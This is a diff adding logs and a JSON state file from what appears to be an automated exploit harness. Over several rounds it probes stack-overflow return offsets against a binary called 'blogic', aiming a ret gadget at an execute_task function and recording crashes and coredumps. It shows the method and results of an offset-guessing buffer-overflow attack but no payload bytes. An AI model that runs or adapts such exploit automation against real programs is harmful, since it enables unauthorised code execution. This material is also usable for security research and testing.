@@ -1,0 +1,186 @@
+===== PHASE 3 ADAPTIVE exploit.log =====
+[2026-05-22 16:50:04] [*] Adaptive static-analysis-driven exploit started
+[2026-05-22 16:50:04] [*] Running target analyzer
+[2026-05-22 16:50:04] [*] Analyzer stdout:
+[2026-05-22 16:50:04]     [*] Level 5C corrected target analysis complete
+[2026-05-22 16:50:04]     [*] Report written to /shared/target_info.json
+[2026-05-22 16:50:04]     [*] Log written to /shared/target_analysis.log
+[2026-05-22 16:50:05] [+] Analyzer completed successfully
+[2026-05-22 16:50:05] [+] Selected execute_task: _Z12execute_taskv at 0x401415
+[2026-05-22 16:50:05] [+] Selected ret gadget from analyzer: 0x401414
+[2026-05-22 16:50:05] [!] Analyzer did not infer offset; using state offset_to_ret: 104
+[2026-05-22 16:50:05] [*] Adaptive offset candidate index: 5
+[2026-05-22 16:50:05] [*] Adaptive offset candidate value: 104
+[2026-05-22 16:50:05] [+] State written to /shared/state.json
+[2026-05-22 16:50:05] [*] Agent mode: adaptive_offset_probe
+[2026-05-22 16:50:05] [*] Using offset_to_ret: 104
+[2026-05-22 16:50:05] [*] Using offset_source: adaptive_offset_probe
+[2026-05-22 16:50:05] [*] Using offset_reason: trying candidate offset 104 at index 5 from offset_candidates
+[2026-05-22 16:50:05] [*] Using ret_gadget: 0x401414
+[2026-05-22 16:50:05] [*] Using ret_gadget_source: analyzer_preferred_ret
+[2026-05-22 16:50:05] [*] Using execute_task: 0x401415
+[2026-05-22 16:50:05] [+] Wrote adaptive_offset_probe payload to /shared/config.data
+[2026-05-22 16:50:05] [+] Payload length: 120 bytes
+[2026-05-22 16:50:05] [+] Created /shared/exploit_done
+[2026-05-22 16:50:05] [+] Exploit input generation completed
+===== PHASE 3 ADAPTIVE triage.log =====
+[2026-05-22 16:50:04] [*] Adaptive triage feedback module started
+[2026-05-22 16:50:04] [*] Loaded state round=5 strategy=adaptive_static_analysis_driven_agent
+[2026-05-22 16:50:04] [*] offset_status=adaptive_probe
+[2026-05-22 16:50:04] [*] offset_candidate_index=4
+[2026-05-22 16:50:04] [*] offset_to_ret=96
+[2026-05-22 16:50:04] [*] success.txt exists: False
+[2026-05-22 16:50:04] [*] coredump count: 1
+[2026-05-22 16:50:04] [*] coredump: name=blogic-38.core size=0 path=/shared/coredump/blogic-38.core
+[2026-05-22 16:50:04] [*] Adaptive offset probe advanced: 96 -> 104
+[2026-05-22 16:50:04] [+] last_result=crash
+[2026-05-22 16:50:04] [+] next_action=try_next_offset_candidate
+[2026-05-22 16:50:04] [+] status=needs_next_attempt
+[2026-05-22 16:50:04] [+] offset_status=adaptive_probe
+[2026-05-22 16:50:04] [+] offset_candidate_index=5
+[2026-05-22 16:50:04] [+] offset_to_ret=104
+[2026-05-22 16:50:04] [+] state updated at /shared/state.json
+===== PHASE 3 ADAPTIVE state.json =====
+{
+  "round": 6,
+  "offset_status": "adaptive_probe",
+  "offset_candidates": [
+    64,
+    72,
+    80,
+    88,
+    96,
+    104,
+    112,
+    120,
+    128
+  ],
+  "offset_candidate_index": 5,
+  "next_action": "try_next_offset_candidate",
+  "probe_length": 160,
+  "offset_to_ret": 104,
+  "offset_source": "adaptive_offset_probe",
+  "offset_reason": "trying candidate offset 104 at index 5 from offset_candidates",
+  "analysis_done": true,
+  "target_path": "/shared/blogic",
+  "pie": false,
+  "nx_enabled": true,
+  "strategy": "adaptive_static_analysis_driven_agent",
+  "ret_gadget": "0x401414",
+  "ret_gadget_source": "analyzer_preferred_ret",
+  "execute_task": "0x401415",
+  "mode": "adaptive_offset_probe",
+  "last_tried_offset": 96,
+  "last_triage_time": 1779468604,
+  "last_result": "crash",
+  "last_success_txt_exists": false,
+  "last_coredump_count": 1,
+  "last_coredumps": [
+    {
+      "path": "/shared/coredump/blogic-38.core",
+      "name": "blogic-38.core",
+      "size": 0,
+      "mtime": 1779468704
+    }
+  ],
+  "history": [
+    {
+      "round": 1,
+      "timestamp": 1779468603,
+      "result": "no_success_no_coredump",
+      "success_txt_exists": false,
+      "coredump_count": 0,
+      "coredumps": [],
+      "strategy": "adaptive_static_analysis_driven_agent",
+      "mode": "adaptive_offset_probe",
+      "offset_status": "adaptive_probe",
+      "offset_candidate_index": 1,
+      "last_tried_offset": 64,
+      "offset_to_ret": 72,
+      "offset_source": "adaptive_offset_probe",
+      "ret_gadget": "0x401414",
+      "execute_task": "0x401415",
+      "next_action": "try_next_offset_candidate"
+    },
+    {
+      "round": 2,
+      "timestamp": 1779468603,
+      "result": "no_success_no_coredump",
+      "success_txt_exists": false,
+      "coredump_count": 0,
+      "coredumps": [],
+      "strategy": "adaptive_static_analysis_driven_agent",
+      "mode": "adaptive_offset_probe",
+      "offset_status": "adaptive_probe",
+      "offset_candidate_index": 2,
+      "last_tried_offset": 72,
+      "offset_to_ret": 80,
+      "offset_source": "adaptive_offset_probe",
+      "ret_gadget": "0x401414",
+      "execute_task": "0x401415",
+      "next_action": "try_next_offset_candidate"
+    },
+    {
+      "round": 3,
+      "timestamp": 1779468604,
+      "result": "no_success_no_coredump",
+      "success_txt_exists": false,
+      "coredump_count": 0,
+      "coredumps": [],
+      "strategy": "adaptive_static_analysis_driven_agent",
+      "mode": "adaptive_offset_probe",
+      "offset_status": "adaptive_probe",
+      "offset_candidate_index": 3,
+      "last_tried_offset": 80,
+      "offset_to_ret": 88,
+      "offset_source": "adaptive_offset_probe",
+      "ret_gadget": "0x401414",
+      "execute_task": "0x401415",
+      "next_action": "try_next_offset_candidate"
+    },
+    {
+      "round": 4,
+      "timestamp": 1779468604,
+      "result": "no_success_no_coredump",
+      "success_txt_exists": false,
+      "coredump_count": 0,
+      "coredumps": [],
+      "strategy": "adaptive_static_analysis_driven_agent",
+      "mode": "adaptive_offset_probe",
+      "offset_status": "adaptive_probe",
+      "offset_candidate_index": 4,
+      "last_tried_offset": 88,
+      "offset_to_ret": 96,
+      "offset_source": "adaptive_offset_probe",
+      "ret_gadget": "0x401414",
+      "execute_task": "0x401415",
+      "next_action": "try_next_offset_candidate"
+    },
+    {
+      "round": 5,
+      "timestamp": 1779468604,
+      "result": "crash",
+      "success_txt_exists": false,
+      "coredump_count": 1,
+      "coredumps": [
+        {
+          "path": "/shared/coredump/blogic-38.core",
+          "name": "blogic-38.core",
+          "size": 0,
+          "mtime": 1779468704
+        }
+      ],
+      "strategy": "adaptive_static_analysis_driven_agent",
+      "mode": "adaptive_offset_probe",
+      "offset_status": "adaptive_probe",
+      "offset_candidate_index": 5,
+      "last_tried_offset": 96,
+      "offset_to_ret": 104,
+      "offset_source": "adaptive_offset_probe",
+      "ret_gadget": "0x401414",
+      "execute_task": "0x401415",
+      "next_action": "try_next_offset_candidate"
+    }
+  ],
+  "status": "needs_next_attempt"
+}
